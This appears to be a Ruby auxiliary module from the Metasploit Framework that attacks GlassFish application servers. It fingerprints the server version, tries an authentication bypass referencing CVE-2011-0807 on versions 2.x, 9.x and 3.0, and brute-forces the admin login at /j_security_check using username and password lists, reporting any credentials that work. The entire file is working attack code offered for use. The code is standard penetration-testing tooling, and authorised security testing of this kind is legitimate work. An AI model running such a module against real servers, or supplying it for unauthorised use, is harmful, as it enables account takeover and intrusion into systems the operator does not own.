##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'GlassFish Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to GlassFish instance using username
        and password combindations indicated by the USER_FILE, PASS_FILE,
        and USERPASS_FILE options.
      },
      'Author'         =>
        [
          'Joshua Abraham <jabra[at]rapid7.com>'
        ],
      'References'     =>
        [
          ['CVE', '2011-0807'],
          ['OSVDB', '71948'],
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(4848),
        OptString.new('TARGETURI', [true, 'The URI path of the GlassFish Server', '/']),
        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
      ], self.class)
  end

  #
  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x) and
  # banner (ex: Sun Java System Application Server 9.x)
  #
  def get_version(res)
    #Extract banner from response
    banner = res.headers['Server'] || ''

    #Default value for edition and glassfish version
    edition = 'Commercial'
    version = 'Unknown'

    #Set edition (Open Source or Commercial)
    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/
    edition = 'Open Source' if banner =~ p

    #Set version.  Some GlassFish servers return banner "GlassFish v3".
    if banner =~ /(GlassFish Server|Open Source Edition) (\d\.\d)/
      version = $2
    elsif banner =~ /GlassFish v(\d)/ and version.nil?
      version = $1
    elsif banner =~ /Sun GlassFish Enterprise Server v2/ and version.nil?
      version = '2.x'
    elsif banner =~ /Sun Java System Application Server 9/ and version.nil?
      version = '9.x'
    end

    print_status("Unsupported version: #{banner}") if version.nil? or version == 'Unknown'

    return edition, version, banner
  end

  def log_success(user,pass)
    print_good("#{target_host()} - GlassFish - SUCCESSFUL login for '#{user}' : '#{pass}'")
    report_auth_info(
      :host   => rhost,
      :port   => rport,
      :sname => (ssl ? 'https' : 'http'),
      :user   => user,
      :pass   => pass,
      :proof  => "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
      :source_type => "user_supplied",
      :active => true
    )
  end

  #
  # Send GET or POST request, and return the response
  #
  def send_request(path, method, session='', data=nil, ctype=nil)

    headers = {}
    headers['Cookie'] = "JSESSIONID=#{session}" if session != ''
    headers['Content-Type'] = ctype if ctype != nil
    headers['Content-Length'] = data.length if data != nil

    uri = normalize_uri(target_uri.path)
    res = send_request_raw({
      'uri'	  => "#{uri}#{path}",
      'method'  => method,
      'data'	  => data,
      'headers' => headers,
    }, 90)

    return res
  end

  #
  # Try to login to Glassfish with a credential, and return the response
  #
  def try_login(user, pass)
    data  = "j_username=#{Rex::Text.uri_encode(user.to_s)}&"
    data << "j_password=#{Rex::Text.uri_encode(pass.to_s)}&"
    data << "loginButton=Login"

    path = '/j_security_check'
    res = send_request(path, 'POST', '', data, 'application/x-www-form-urlencoded')

    return res
  end

  def try_glassfish_auth_bypass(version)
    print_status("Trying GlassFish authentication bypass..")
    success = false

    if version == '2.x' or version == '9.x'
      res = send_request('/applications/upload.jsf', 'get')
      p = /<title>Deploy Enterprise Applications\/Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    else
      # 3.0
      res = send_request('/common/applications/uploadFrame.jsf', 'get')
      p = /<title>Deploy Applications or Modules/
      if (res and res.code.to_i == 200 and res.body.match(p) != nil)
        success = true
      end
    end

    if success == true
      print_good("#{target_host} - GlassFish - SUCCESSFUL authentication bypass")
      report_auth_info(
        :host	=> rhost,
        :port	=> rport,
        :sname => (ssl ? 'https' : 'http'),
        :user	=> '',
        :pass	=> '',
        :proof	=> "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
        :source_type => "user_supplied",
        :active => true
      )
    else
      print_error("#{target_host()} - GlassFish - Failed authentication bypass")
    end

    return success
  end

  def try_glassfish_login(version,user,pass)
    success = false
    session = ''
    res = ''
    if version == '2.x' or version == '9.x'
      print_status("Trying credential GlassFish 2.x #{user}:'#{pass}'....")
      res = try_login(user,pass)
      if res and res.code == 302
        session = $1 if (res and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*); /i)
        res = send_request('/applications/upload.jsf', 'GET', session)

        p = /<title>Deploy Enterprise Applications\/Modules/
        if (res and res.code.to_i == 200 and res.body.match(p) != nil)
          success = true
        end
      end

    else
      print_status("Trying credential GlassFish 3.x #{user}:'#{pass}'....")
      res = try_login(user,pass)
      if res and res.code == 302
        session = $1 if (res and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*); /i)
        res = send_request('/common/applications/uploadFrame.jsf', 'GET', session)

        p = /<title>Deploy Applications or Modules/
        if (res and res.code.to_i == 200 and res.body.match(p) != nil)
          success = true
        end
      end
    end

    if success == true
      log_success(user,pass)
    else
      msg = "#{target_host()} - GlassFish - Failed to authenticate login for '#{user}' : '#{pass}'"
      print_error(msg)
    end

    return success, res, session
  end

  def run_host(ip)
    #Invoke index to gather some info
    res = send_request('/common/index.jsf', 'GET')

    #Abort if res returns nil due to an exception (broken pipe or timeout)
    if res.nil?
      print_error("Unable to get a response from the server.")
      return
    end

    if res.code.to_i == 302
      res = send_request('/login.jsf', 'GET')
    end

    #Get GlassFish version
    edition, version, banner = get_version(res)
    path = normalize_uri(target_uri.path)
    target_url = "http://#{rhost.to_s}:#{rport.to_s}/#{path.to_s}"
    print_status("#{target_url} - GlassFish - Attempting authentication")

    if (version == '2.x' or version == '9.x' or version == '3.0')
      try_glassfish_auth_bypass(version)
    end

    each_user_pass do |user, pass|
      try_glassfish_login(version, user, pass)
    end
  end

end
